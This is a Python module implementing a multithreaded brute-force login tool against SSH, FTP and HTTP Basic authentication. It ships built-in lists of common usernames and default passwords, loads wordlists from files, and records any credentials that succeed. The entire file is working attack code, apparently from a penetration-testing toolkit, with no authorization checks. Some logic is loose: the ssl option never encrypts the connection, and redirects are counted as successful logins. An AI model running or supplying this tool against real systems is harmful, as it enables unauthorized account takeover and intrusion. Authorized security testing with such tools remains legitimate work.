import socket
import time
import threading
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Tuple, Callable
from datetime import datetime


@dataclass
class BruteForceResult:
    service: str = ""
    target: str = ""
    port: int = 0
    username: str = ""
    password: str = ""
    success: bool = False
    error: str = ""


@dataclass
class BruteForceSummary:
    service: str = ""
    target: str = ""
    port: int = 0
    total_attempts: int = 0
    successful: List[BruteForceResult] = field(default_factory=list)
    failed: int = 0
    duration: float = 0.0
    error: str = ""


class BruteForceModule:
    COMMON_USERNAMES = [
        "admin", "root", "administrator", "user", "test", "guest",
        "operator", "manager", "sa", "oracle", "postgres", "mysql",
        "pi", "ubuntu", "debian", "centos", "ftp", "anonymous",
        "webadmin", "backup", "nagios", "tomcat", "jboss", "jenkins",
    ]

    COMMON_PASSWORDS = [
        "admin", "root", "password", "123456", "12345678", "1234",
        "12345", "passwd", "test", "guest", "qwerty", "letmein",
        "welcome", "monkey", "dragon", "master", "admin123",
        "password123", "admin1", "administrator", "secret",
        "P@ssw0rd", "pass123", "admin1234", "root123", "toor",
        "default", "temp", "temp123", "changeme", "abc123",
        "123456789", "111111", "000000", "sunshine", "iloveyou",
        "trustno1", "passw0rd", "Pa$$w0rd", "admin2024", "admin2023",
    ]

    def __init__(self, display: Any = None):
        self._stop_flag = threading.Event()
        self.display = display

    def _log(self, msg: str, level: str = "info"):
        if self.display:
            getattr(self.display, level, self.display.info)(msg)

    def stop(self):
        self._stop_flag.set()

    def _attempt_ssh(
        self, host: str, port: int, username: str, password: str,
        timeout: float
    ) -> bool:
        try:
            if port != 22:
                sock = socket.create_connection((host, port), timeout=timeout)
                sock.close()
            try:
                import paramiko
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(
                    host, port=port, username=username,
                    password=password, timeout=timeout, look_for_keys=False,
                    allow_agent=False,
                )
                client.close()
                return True
            except ImportError:
                sock = socket.create_connection((host, port), timeout=timeout)
                banner = sock.recv(1024).decode(errors="ignore")
                sock.close()
                if "SSH" in banner:
                    return False
                return False
            except (paramiko.AuthenticationException, paramiko.SSHException):
                return False
            except (socket.timeout, ConnectionRefusedError, OSError):
                return False
        except ImportError:
            return False
        except Exception:
            return False

    def _attempt_ftp(
        self, host: str, port: int, username: str, password: str,
        timeout: float
    ) -> bool:
        try:
            from ftplib import FTP
            ftp = FTP(timeout=timeout)
            ftp.connect(host, port)
            try:
                ftp.login(username, password)
                ftp.quit()
                return True
            except Exception:
                ftp.quit()
                return False
        except (socket.timeout, ConnectionRefusedError, OSError):
            return False
        except ImportError:
            return False
        except Exception:
            return False

    def _attempt_http_basic(
        self, host: str, port: int, username: str, password: str,
        timeout: float, path: str = "/", ssl: bool = False
    ) -> bool:
        import base64
        try:
            scheme = "https" if ssl else "http"
            sock = socket.create_connection((host, port), timeout=timeout)
            auth_str = f"{username}:{password}"
            auth_b64 = base64.b64encode(auth_str.encode()).decode()
            request = (
                f"GET {path} HTTP/1.0\r\n"
                f"Host: {host}:{port}\r\n"
                f"Authorization: Basic {auth_b64}\r\n"
                f"Connection: close\r\n\r\n"
            )
            sock.sendall(request.encode())
            response = sock.recv(4096).decode(errors="ignore")
            sock.close()
            if "HTTP/1." not in response:
                return False
            status_line = response.split("\r\n")[0]
            if "200" in status_line or "301" in status_line or "302" in status_line:
                return True
            return False
        except (socket.timeout, ConnectionRefusedError, OSError):
            return False
        except Exception:
            return False

    def _worker(
        self, service: str, host: str, port: int,
        usernames: List[str], passwords: List[str],
        results: List[BruteForceResult], timeout: float,
        max_threads: int, path: str, ssl: bool,
    ):
        attempt_fn = {
            "ssh": self._attempt_ssh,
            "ftp": self._attempt_ftp,
            "http-basic": self._attempt_http_basic,
        }.get(service)

        if not attempt_fn:
            return

        total = len(usernames) * len(passwords)
        attempted = 0
        lock = threading.Lock()

        def try_cred(user: str, pwd: str):
            nonlocal attempted
            if self._stop_flag.is_set():
                return
            success = attempt_fn(host, port, user, pwd, timeout)
            with lock:
                attempted += 1
                if self.display:
                    self.display.print(
                        f"\r  [{service}] {attempted}/{total} "
                        f"({user}:{pwd}){' ' * 10}",
                        end="",
                    )
            if success:
                result = BruteForceResult(
                    service=service, target=host, port=port,
                    username=user, password=pwd, success=True,
                )
                with lock:
                    results.append(result)

        threads = []
        for user in usernames:
            for pwd in passwords:
                if self._stop_flag.is_set():
                    break
                t = threading.Thread(target=try_cred, args=(user, pwd), daemon=True)
                t.start()
                threads.append(t)
                while sum(1 for th in threads if th.is_alive()) >= max_threads:
                    time.sleep(0.05)
                    for i, th in enumerate(threads):
                        if not th.is_alive():
                            threads[i] = None
                    threads = [th for th in threads if th is not None]
            if self._stop_flag.is_set():
                break

        for t in threads:
            if t:
                t.join()

    def brute_force(
        self, service: str, target: str, port: Optional[int] = None,
        usernames: Optional[List[str]] = None,
        passwords: Optional[List[str]] = None,
        user_file: Optional[str] = None,
        pass_file: Optional[str] = None,
        timeout: float = 10.0,
        max_threads: int = 10,
        path: str = "/",
        ssl: bool = False,
    ) -> BruteForceSummary:
        self._stop_flag.clear()

        port_map = {"ssh": 22, "ftp": 21, "http-basic": 80}
        service = service.lower().replace("_", "-").replace(" ", "-")
        if service not in port_map:
            return BruteForceSummary(error=f"Unsupported service: {service}")
        if port is None:
            port = port_map.get(service, 80)

        if ssl and service == "http-basic":
            port = port or 443

        user_list: List[str] = []
        pass_list: List[str] = []

        if user_file:
            try:
                with open(user_file, "r") as f:
                    user_list = [line.strip() for line in f if line.strip()]
            except FileNotFoundError:
                return BruteForceSummary(error=f"Userlist file not found: {user_file}")
        elif usernames:
            user_list = usernames
        else:
            user_list = self.COMMON_USERNAMES[:]

        if pass_file:
            try:
                with open(pass_file, "r") as f:
                    pass_list = [line.strip() for line in f if line.strip()]
            except FileNotFoundError:
                return BruteForceSummary(error=f"Passlist file not found: {pass_file}")
        elif passwords:
            pass_list = passwords
        else:
            pass_list = self.COMMON_PASSWORDS[:]

        if not user_list or not pass_list:
            return BruteForceSummary(error="Username or password list is empty")

        results: List[BruteForceResult] = []
        start = time.time()

        self._log(f"Starting {service} brute force on {target}:{port}")
        self._log(f"  Users: {len(user_list)}, Passwords: {len(pass_list)}")
        self._log(f"  Total attempts: {len(user_list) * len(pass_list)}")

        self._worker(
            service, target, port, user_list, pass_list,
            results, timeout, max_threads, path, ssl,
        )

        duration = time.time() - start
        summary = BruteForceSummary(
            service=service, target=target, port=port,
            total_attempts=len(user_list) * len(pass_list),
            successful=results,
            failed=(len(user_list) * len(pass_list)) - len(results),
            duration=duration,
        )
        return summary
